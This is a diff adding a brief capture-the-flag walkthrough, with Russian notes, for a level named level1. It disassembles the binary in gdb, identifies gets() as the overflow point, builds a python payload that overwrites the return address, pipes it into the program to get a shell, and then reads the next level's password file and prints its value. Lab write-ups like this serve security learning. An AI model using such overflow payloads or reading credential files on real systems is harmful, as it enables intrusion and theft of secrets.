@@ -1,0 +1,18 @@
+1) gdb level1 
+disass main 
+   0x08048480 <+0>:	push   %ebp
+   0x08048481 <+1>:	mov    %esp,%ebp
+   0x08048483 <+3>:	and    $0xfffffff0,%esp
+   0x08048486 <+6>:	sub    $0x50,%esp
+   0x08048489 <+9>:	lea    0x10(%esp),%eax
+   0x0804848d <+13>:	mov    %eax,(%esp)
+   0x08048490 <+16>:	call   0x8048340 <gets@plt>
+   0x08048495 <+21>:	leave  
+   0x08048496 <+22>:	ret   
+
+2) Видим, что используется функция gets, в связи с этим можно попробовать атаку переполнением буффера
+3) python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/exploit
+4) cat /tmp/exploit - | ./level1
+Good... Wait what?
+5) cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
